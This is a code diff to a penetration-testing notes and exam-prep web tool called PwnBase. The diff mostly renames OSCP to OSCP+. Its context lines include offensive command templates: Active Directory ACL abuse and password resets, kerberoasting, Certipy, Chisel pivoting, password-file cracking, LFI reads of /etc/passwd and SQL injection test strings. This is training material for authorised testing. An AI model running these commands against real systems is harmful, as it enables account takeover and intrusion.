@@ -654,7 +654,7 @@ mark { background: var(--amber); color: var(--bg); padding: 0 2px; border-radius
     <p>PwnBase is a penetration testing documentation tool designed <strong>exclusively</strong> for:</p>
     <p>
       • Authorized penetration testing engagements<br>
-      • Certification exams (OSCP, PNPT, CPTS, etc.)<br>
+      • Certification exams (OSCP+, PNPT, CPTS, etc.)<br>
       • Lab environments and CTF challenges<br>
       • Security research with proper authorization
     </p>
@@ -1244,7 +1244,7 @@ const GUIDES = {
       {
         title: 'First: Are You Sure?',
         collapsed: false,
-        content: `<span class="tag critical">RESCAN FIRST</span><p>SSH-only is rare in OSCP. You likely missed ports.</p>`,
+        content: `<span class="tag critical">RESCAN FIRST</span><p>SSH-only is rare in OSCP+. You likely missed ports.</p>`,
         commands: [
           { label: 'Full TCP scan', cmd: 'nmap -p- -T4 --min-rate 1000 TARGET' },
           { label: 'UDP top 200', cmd: 'sudo nmap -sU --top-ports 200 TARGET' },
@@ -1323,7 +1323,7 @@ const GUIDES = {
   },
   'web-only': {
     title: 'Web-Only Boxes',
-    intro: 'Most OSCP boxes are web-heavy. Systematic enumeration is key.',
+    intro: 'Most OSCP+ boxes are web-heavy. Systematic enumeration is key.',
     sections: [
       {
         title: 'CMS Identification',
@@ -1750,7 +1750,7 @@ const GUIDES = {
   },
   'missed': {
     title: 'Things People Commonly Miss',
-    intro: 'Before giving up, go through this list. OSCP boxes always have a path.',
+    intro: 'Before giving up, go through this list. OSCP+ boxes always have a path.',
     sections: [
       {
         title: 'Scanning & Enumeration',
@@ -2485,13 +2485,13 @@ const GUIDES = {
   },
   'ad-acl': {
     title: 'ACL Abuse',
-    intro: 'Misconfigured ACLs are very common in OSCP. BloodHound will show these paths.',
+    intro: 'Misconfigured ACLs are very common in OSCP+. BloodHound will show these paths.',
     sections: [
       {
         title: 'ACL Abuse (GenericAll / WriteDacl / WriteOwner)',
         collapsed: false,
         content: `<span class="tag critical">CHECK BLOODHOUND</span>
-<p>Misconfigured ACLs are very common in OSCP. BloodHound will show these paths. Here are the main ones:</p>`,
+<p>Misconfigured ACLs are very common in OSCP+. BloodHound will show these paths. Here are the main ones:</p>`,
         commands: [
           { label: 'GenericAll on user → reset password', cmd: "net user TARGET_USER NewPassword123! /domain" },
           { label: 'GenericAll on user → targeted kerberoast', cmd: "powershell -ep bypass -c \"Import-Module .\\PowerView.ps1; Set-DomainObject -Identity TARGET_USER -Set @{serviceprincipalname='fakeservice/fake'}\";\nimpacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip TARGET -request" },
@@ -2596,7 +2596,7 @@ const GUIDES = {
       {
         title: 'Certificate Abuse (AD CS / ESC1-ESC8)',
         collapsed: false,
-        content: `<span class="tag critical">HIGH VALUE IN OSCP</span>
+        content: `<span class="tag critical">HIGH VALUE IN OSCP+</span>
 <p>Active Directory Certificate Services (AD CS) misconfigurations allow privilege escalation to Domain Admin.</p>`,
         commands: [
           { label: 'Find vulnerable templates (Certipy)', cmd: 'certipy find -u USER@DOMAIN -p PASS -dc-ip TARGET -vulnerable' },
@@ -2842,12 +2842,12 @@ const GUIDES = {
   },
   'cmd-pivoting': {
     title: 'Pivoting / Tunneling / Chisel',
-    intro: 'Access internal networks through compromised hosts. Chisel is the go-to tool for OSCP.',
+    intro: 'Access internal networks through compromised hosts. Chisel is the go-to tool for OSCP+.',
     sections: [
       {
         title: 'Chisel - Reverse SOCKS Proxy',
         collapsed: false,
-        content: `<span class="tag critical">MOST COMMON IN OSCP</span>
+        content: `<span class="tag critical">MOST COMMON IN OSCP+</span>
 <p>Route all traffic through a compromised host to reach internal networks. Reverse mode = target connects back to you.</p>
 <h4>Step-by-Step:</h4>
 <div class="step"><div class="step-num">1</div><div class="step-content">Transfer chisel binary to target</div></div>
@@ -2916,7 +2916,7 @@ const GUIDES = {
       {
         title: 'Double Pivoting',
         collapsed: true,
-        content: `<span class="tag important">OSCP may require this</span>
+        content: `<span class="tag important">OSCP+ may require this</span>
 <p>Reach a third network through two compromised hosts.</p>`,
         commands: [
           { label: 'Chisel double pivot', cmd: '# 1. First pivot: Attacker → Target1\nchisel server --reverse -p 8081  # attacker\n./chisel client YOUR_IP:8081 R:socks  # target1\n\n# 2. Transfer chisel to Target2 via proxychains\nproxychains scp chisel user@TARGET2:/tmp/\n\n# 3. Second pivot: Target1 → Target2\n./chisel server --reverse -p 9001  # on target1\n./chisel client TARGET1_IP:9001 R:1081:socks  # on target2\n\n# 4. Add second proxy to proxychains.conf\n# socks5 127.0.0.1 1081' },
@@ -3114,7 +3114,7 @@ const GUIDES = {
   },
   'proof-collection': {
     title: 'Proof Collection',
-    intro: 'OSCP requires specific screenshots. Miss one = lose points. Run these commands IMMEDIATELY after getting user/root.',
+    intro: 'OSCP+ requires specific screenshots. Miss one = lose points. Run these commands IMMEDIATELY after getting user/root.',
     sections: [
       {
         title: 'Linux Proof',
@@ -3235,7 +3235,7 @@ const GUIDES = {
   },
   'exam-strategy': {
     title: 'Exam Strategy & Timer',
-    intro: 'The OSCP exam is 23:45 hours. Most people fail because of TIME MANAGEMENT, not lack of skills. Follow this strategy.',
+    intro: 'The OSCP+ exam is 23:45 hours. Most people fail because of TIME MANAGEMENT, not lack of skills. Follow this strategy.',
     sections: [
       {
         title: 'Exam Structure',
@@ -3278,7 +3278,7 @@ const GUIDES = {
 <li><strong>Take screenshots AS YOU GO.</strong> Don't wait until the end.</li>
 <li><strong>Document every step.</strong> Write notes in the Report Editor as you go. You WILL forget steps.</li>
 <li><strong>Submit flags IMMEDIATELY</strong> in the exam control panel. Don't save them for later.</li>
-<li><strong>No rabbit holes:</strong> If something feels too complex for OSCP, it probably is. Look elsewhere.</li>
+<li><strong>No rabbit holes:</strong> If something feels too complex for OSCP+, it probably is. Look elsewhere.</li>
 <li><strong>Credential reuse:</strong> Found a password? Try it on EVERY machine/service.</li>
 <li><strong>Check ALL ports:</strong> Run a full port scan. Hidden services on high ports are common.</li>
 <li><strong>Read error messages:</strong> They often contain version info or path disclosure.</li>
@@ -3379,7 +3379,7 @@ const GUIDES = {
   },
   'ad-chain': {
     title: 'AD Attack Chain',
-    intro: 'The OSCP AD set is all-or-nothing (40 points). Follow this chain systematically. Do NOT skip steps.',
+    intro: 'The OSCP+ AD set is all-or-nothing (40 points). Follow this chain systematically. Do NOT skip steps.',
     sections: [
       {
         title: 'Phase 1: Reconnaissance',
@@ -3525,7 +3525,7 @@ const GUIDES = {
       {
         title: 'File Password Cracking',
         collapsed: false,
-        content: `<span class="tag critical">COMMON IN OSCP</span><p>Found a password-protected file? Extract hash → crack it.</p>`,
+        content: `<span class="tag critical">COMMON IN OSCP+</span><p>Found a password-protected file? Extract hash → crack it.</p>`,
         commands: [
           { label: 'ZIP file', cmd: 'zip2john protected.zip > zip_hash.txt\njohn zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n# Or hashcat:\nzip2john protected.zip | cut -d: -f2 > zip_hashcat.txt\nhashcat -m 17200 zip_hashcat.txt /usr/share/wordlists/rockyou.txt  # PKZIP\nhashcat -m 13600 zip_hashcat.txt /usr/share/wordlists/rockyou.txt  # WinZip' },
           { label: 'RAR / WinRAR file', cmd: 'rar2john protected.rar > rar_hash.txt\njohn rar_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n# Or hashcat:\nhashcat -m 13000 rar_hash.txt /usr/share/wordlists/rockyou.txt  # RAR3\nhashcat -m 23700 rar_hash.txt /usr/share/wordlists/rockyou.txt  # RAR5' },
@@ -3581,12 +3581,12 @@ const GUIDES = {
   },
   'cmd-webattacks': {
     title: 'Web Attacks Deep-Dive',
-    intro: 'Detailed attack techniques for common web vulnerabilities found in OSCP.',
+    intro: 'Detailed attack techniques for common web vulnerabilities found in OSCP+.',
     sections: [
       {
         title: 'LFI / Local File Inclusion',
         collapsed: false,
-        content: `<span class="tag critical">COMMON IN OSCP</span><p>Look for parameters like: <code>?page=</code>, <code>?file=</code>, <code>?view=</code>, <code>?lang=</code>, <code>?include=</code></p>`,
+        content: `<span class="tag critical">COMMON IN OSCP+</span><p>Look for parameters like: <code>?page=</code>, <code>?file=</code>, <code>?view=</code>, <code>?lang=</code>, <code>?include=</code></p>`,
         commands: [
           { label: 'Basic LFI', cmd: 'curl http://TARGET/index.php?page=../../../../../etc/passwd' },
           { label: 'Null byte (PHP < 5.3)', cmd: 'curl http://TARGET/index.php?page=../../../../../etc/passwd%00' },
@@ -3640,7 +3640,7 @@ const GUIDES = {
       {
         title: 'SQL Injection (Manual)',
         collapsed: false,
-        content: `<span class="tag tip">SQLMAP IS BANNED</span><p>You must do SQL injection manually in OSCP. Test every input field and URL parameter.</p>`,
+        content: `<span class="tag tip">SQLMAP IS BANNED</span><p>You must do SQL injection manually in OSCP+. Test every input field and URL parameter.</p>`,
         commands: [
           { label: 'Detect SQLi', cmd: "# Add these to parameters:\n' \n'' \n; \n-- \n' OR '1'='1\n' OR '1'='1'-- -\n\" OR \"1\"=\"1\"-- -\n1 OR 1=1-- -" },
           { label: 'UNION-based enum columns', cmd: "' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n# Increase until error → number of columns" },
@@ -4769,7 +4769,7 @@ function renderReportOverview(container) {
     <div class="flag-card" style="margin-bottom:16px">
       <h3 style="color:var(--accent);margin-top:0">Student Info</h3>
       <div class="flag-row"><label>Lab</label>
-        <input class="flag-input" style="color:var(--text)" value="${escapeHtml(targetData.labName || '')}" placeholder="e.g. OSCP Lab 2026-03" oninput="targetData.labName=this.value.trim();saveTargetData();">
+        <input class="flag-input" style="color:var(--text)" value="${escapeHtml(targetData.labName || '')}" placeholder="e.g. OSCP+ Lab 2026-03" oninput="targetData.labName=this.value.trim();saveTargetData();">
       </div>
       <div class="flag-row"><label>Name</label>
         <input class="flag-input" style="color:var(--text)" value="${escapeHtml(targetData.studentName || '')}" placeholder="Full name" oninput="targetData.studentName=this.value.trim();saveTargetData();">
@@ -6476,7 +6476,7 @@ async function _buildPDF(machines) {
 
     doc.setFontSize(32);
     doc.setFont('helvetica', 'bold');
-    doc.text('OSCP', m, 55);
+    doc.text('OSCP+', m, 55);
     doc.setFontSize(20);
     doc.text('Penetration Test Report', m, 67);
 
@@ -6574,7 +6574,7 @@ async function _buildPDF(machines) {
       .map(m => `${m.hostname} (${m.ip}):\n${m.report.executiveSummary.trim()}`);
     const summaryText = customSummaries.length > 0
       ? customSummaries.join('\n\n')
-      : `This report presents the findings of an OSCP penetration test conducted on ${today}. The assessment targeted ${machines.length} machine${machines.length > 1 ? 's' : ''} in the exam environment. Each machine was approached systematically through reconnaissance, initial access, and privilege escalation phases.`;
+      : `This report presents the findings of an OSCP+ penetration test conducted on ${today}. The assessment targeted ${machines.length} machine${machines.length > 1 ? 's' : ''} in the exam environment. Each machine was approached systematically through reconnaissance, initial access, and privilege escalation phases.`;
     y = pdfWriteWrapped(doc, summaryText, m, y, cw, 5.5);
     y += 8;
 
@@ -6632,7 +6632,7 @@ async function _buildPDF(machines) {
     // ========== SAVE ==========
     const dateStr = new Date().toISOString().slice(0, 10);
     const name = machines.length === 1 ? machines[0].hostname : 'all';
-    doc.save(`OSCP_Report_${name}_${dateStr}.pdf`);
+    doc.save(`OSCP+_Report_${name}_${dateStr}.pdf`);
 
   } catch (e) {
     console.error('PDF generation failed:', e);
@@ -7726,8 +7726,7 @@ document.addEventListener('keydown', (e) => {
 const MODES = {
   lab:       { key: 'lab',       label: 'Lab / Practice',  icon: '🧪', timer: false, duration: 0, desc: 'Free practice, no time limit' },
   pentest:   { key: 'pentest',   label: 'Pentest',         icon: '🔐', timer: false, duration: 0, desc: 'Professional pentest engagement' },
-  oscp:      { key: 'oscp',      label: 'OSCP Exam',       icon: '🎯', timer: true,  duration: 23 * 60 + 45, desc: '23h 45min — 3 Standalones + AD Set' },
-  oscpPlus:  { key: 'oscpPlus',  label: 'OSCP+ Exam',      icon: '🎯', timer: true,  duration: 23 * 60 + 45, desc: '23h 45min — Updated OSCP Format' },
+  oscpPlus:  { key: 'oscpPlus',  label: 'OSCP+ Exam',      icon: '🎯', timer: true,  duration: 23 * 60 + 45, desc: '23h 45min — 3 Standalones + AD Set' },
   pnpt:      { key: 'pnpt',      label: 'PNPT Exam',       icon: '🛡️', timer: true,  duration: 5 * 24 * 60,  desc: '5 days pentest + 2 days report' },
   cpts:      { key: 'cpts',      label: 'HTB CPTS',        icon: '📦', timer: true,  duration: 10 * 24 * 60, desc: '10 days — HackTheBox CPTS' },
   crto:      { key: 'crto',      label: 'CRTO Exam',       icon: '🏴', timer: true,  duration: 48 * 60,      desc: '48h — Certified Red Team Operator' },
@@ -7735,7 +7734,7 @@ const MODES = {
 };
 
 const TIMER_HINTS = {
-  oscp: [
+  oscpPlus: [
     { at: 60,   msg: '1h — no foothold yet? Switch target!' },
     { at: 120,  msg: '2h — switch target if stuck!' },
     { at: 180,  msg: '3h — covered all easy targets?' },
@@ -7746,7 +7745,6 @@ const TIMER_HINTS = {
     { at: 1395, msg: '30min left — report only!' },
     { at: 1410, msg: '15min left! Check screenshots + report!' }
   ],
-  oscpPlus: null, // same as oscp
   pnpt: [
     { at: 60,     msg: 'Day 1 — finish external enumeration' },
     { at: 1440,   msg: 'Day 1 done — attack internal network' },
@@ -7795,7 +7793,7 @@ function getTimerHints() {
   if (!mode || !mode.timer) return [];
   // Check for mode-specific hints
   let hints = TIMER_HINTS[currentMode];
-  if (hints === null) hints = TIMER_HINTS['oscp']; // fallback aliases
+  if (hints === null) hints = TIMER_HINTS['oscpPlus']; // fallback aliases
   if (hints === undefined) hints = TIMER_HINTS['generic'];
   // Convert percentage-based hints to absolute minutes
   if (hints && hints[0] && hints[0].pct !== undefined) {
